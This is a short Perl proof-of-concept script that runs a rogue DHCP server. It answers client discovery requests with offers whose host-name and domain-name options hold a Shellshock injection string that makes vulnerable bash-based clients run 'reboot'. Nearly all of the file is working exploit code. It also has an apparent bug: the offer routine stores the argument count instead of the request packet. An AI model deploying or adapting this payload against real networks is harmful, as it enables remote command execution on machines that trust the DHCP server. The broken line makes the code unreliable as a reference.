#!/usr/bin/perl
# largely purloined from http://www.perlmonks.org/?node_id=1093916 as my PoC for the old options overflow proved too messy^wPerlish to rework - [machine]

use strict;

use IO::Socket;
use Net::DHCP::Packet;
use Net::DHCP::Constants;

my $server_ip = "10.10.10.1";
my $client_ip = "10.10.10.10";
my $subnet_mask = "255.255.255.0";

my $socket_in = IO::Socket::INET->new( LocalPort => 67, LocalAddr => "255.255.255.255", Proto => 'udp') or die $@;

while(1) {
  my $buf;
  $socket_in->recv($buf,4096);
  my $packet = new Net::DHCP::Packet($buf);
  my $messagetype = $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE());
  if ($messagetype eq DHCPDISCOVER()) {
                  send_offer($packet);
  } elsif ($messagetype eq DHCPREQUEST()) {
                  send_ack($packet);
  }
}

sub send_offer {
  my $request = @_;
  my $socket_out = IO::Socket::INET->new( PeerPort => 68, PeerAddr => "255.255.255.255", LocalAddr => "$server_ip:67", Broadcast => 1, Proto => 'udp') or die $@;
  my $offer = new Net::DHCP::Packet(Op => BOOTREPLY(), Xid => $request->xid(), Flags => $request->flags(), Ciaddr => $request->ciaddr(), Yiaddr => $client_ip, Siaddr => $server_ip, Giaddr => $request->giaddr(), Chaddr => $request->chaddr(), DHO_DHCP_MESSAGE_TYPE() => DHCPOFFER());
  $offer->addOptionValue(DHO_SUBNET_MASK(), $subnet_mask);
  $offer->addOptionValue(DHO_NAME_SERVERS, $server_ip);
  $offer->addOptionValue(DHO_HOST_NAME, "() { :; }; reboot");
  $offer->addOptionValue(DHO_DOMAIN_NAME, "() { :; }; reboot");
  $socket_out->send($offer->serialize()) or die $!;
  print STDERR "sent offer\n";
}

sub send_ack {
  print STDERR "send ack\n";
}
